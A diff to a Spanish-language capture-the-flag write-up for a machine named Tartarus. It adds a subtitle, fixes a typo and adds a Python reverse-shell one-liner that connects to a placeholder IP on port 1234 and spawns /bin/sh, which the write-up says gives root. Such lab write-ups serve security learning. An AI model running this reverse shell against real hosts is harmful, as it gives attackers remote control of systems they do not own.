@@ -1,4 +1,5 @@
 # Tartarus
+Máquina sencilla pero con privesc interesante
 ## Initial Scan
 ```
 21/tcp open  ftp     vsftpd 3.0.3
@@ -29,7 +30,7 @@
 
 ## Enum
 ### FTP
-El login anonymous esta permitido, conectemosno y veamos 
+El login anonymous esta permitido, conectemonos y veamos 
 ```
 drwxr-xr-x    3 ftp      ftp          4096 Jul 05 21:31 .
 drwxr-xr-x    3 ftp      ftp          4096 Jul 05 21:31 ..
@@ -121,5 +122,8 @@ except:
   pass
 ```
 Vemos que funciona, podemos o bien tratar de invocar una reverse shell o crackear el shadow.
+```
+import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("IP",1234));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);
+```
 
 Mediante la reverse shell accedemos facilmente como root y ya tenemos la máquina
